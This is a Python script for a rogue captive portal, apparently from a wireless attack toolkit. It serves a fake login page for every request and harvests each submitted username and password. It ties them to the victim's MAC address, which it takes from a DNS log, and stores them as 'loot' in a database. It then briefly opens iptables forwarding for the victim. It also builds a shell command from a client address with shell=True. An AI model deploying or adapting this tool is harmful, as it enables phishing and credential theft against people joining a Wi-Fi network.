#!/usr/bin/python
import subprocess
import sys, time
sys.path.insert(0, '../../../lib/')
from Queries import *
import BaseHTTPServer
import cgi
import os
from os import curdir, sep
from mimetypes import types_map

workspace = "../../../"+sys.argv[1]
PORT = 80

class CaptivePortal(BaseHTTPServer.BaseHTTPRequestHandler):



	def do_GET(self):
			orginal = self.path
			try:
				sendReply = False
				if '?' in self.path:
					self.path = "login.html"
					mimetype='text/html'
					sendReply = True
				if self.path == "/login":
					self.path = "login.html"
					mimetype='text/html'
					sendReply = True
				if self.path == "/":
					self.path = "login.html"
					mimetype='text/html'
					sendReply = True
				if self.path == "favico.ico":
					self.path = "login.html"
					mimetype='text/html'
					sendReply = True
				if self.path.endswith(".jpg"):
					mimetype='image/jpg'
					sendReply = True
				if self.path.endswith(".png"):
					mimetype='image/png'
					sendReply = True
				if self.path.endswith(".gif"):
					mimetype='image/gif'
					sendReply = True
				if self.path.endswith(".css"):
					mimetype='text/css'
					sendReply = True
				if self.path.endswith(".js"):
					mimetype='application/javascript'
					sendReply = True
				if sendReply == True:
					f = open(curdir + sep + self.path, 'rb')
					self.send_response(200)
					self.send_header('Content-type',mimetype)
					self.end_headers()
					self.wfile.write(f.read())
					f.close()
					print(curdir + sep + self.path)
				else:
					self.path = "login.html"
					mimetype='text/html'
					f = open(curdir + sep + self.path, 'rb')
					self.send_response(200)
					self.send_header('Content-type',mimetype)
					self.end_headers()
					self.wfile.write(f.read())
					f.close()
					print(curdir + sep + self.path)
				return
			except IOError:
				self.send_error(404)


	def do_POST(self):
		form = cgi.FieldStorage(
			fp=self.rfile, 
			headers=self.headers,
			environ={'REQUEST_METHOD':'POST',
					 'CONTENT_TYPE':self.headers['Content-Type'],
					 })

		username = form.getvalue("username")
		password = form.getvalue("password")
		remote_IP = self.client_address[0]
		IP_MAC = subprocess.check_output('grep -o -P \'.{0,0}'+remote_IP+'.{0,18}\' ..//dns.log | uniq', shell=True).split(' ')
 		loot = {'MAC': '','Username': '','Password': ''}
		loot.update(Username = username)
		loot.update(MAC = IP_MAC[1].replace("\n","")) 
		loot.update(Password = password)
		print loot
		d = queries()
		d.db_connect(workspace) 
		d.loot(loot)
		print "################################################################################################################"
		print 'MAC ADDRESS: '+str(IP_MAC[1]).replace("\n","")+', USERNAME: '+ str(username).replace('\n','').replace('\'','')+', PASSWORD: '+ str(password)
		print "################################################################################################################"
		subprocess.call(["iptables","-t", "nat", "-I", "PREROUTING","1", "-s", remote_IP, "-j" ,"ACCEPT"])
		subprocess.call(["iptables", "-I", "FORWARD", "-s", remote_IP, "-j" ,"ACCEPT"])
		self.send_response(200)
		self.send_header("Content-type", "text/html")
		self.end_headers()
		time.sleep(5)
		subprocess.call(["iptables", "-D", "FORWARD", "-s", remote_IP, "-j" ,"ACCEPT"])


httpd = BaseHTTPServer.HTTPServer(('', PORT), CaptivePortal)

try:
	httpd.serve_forever()
except KeyboardInterrupt:
	pass
httpd.server_close()


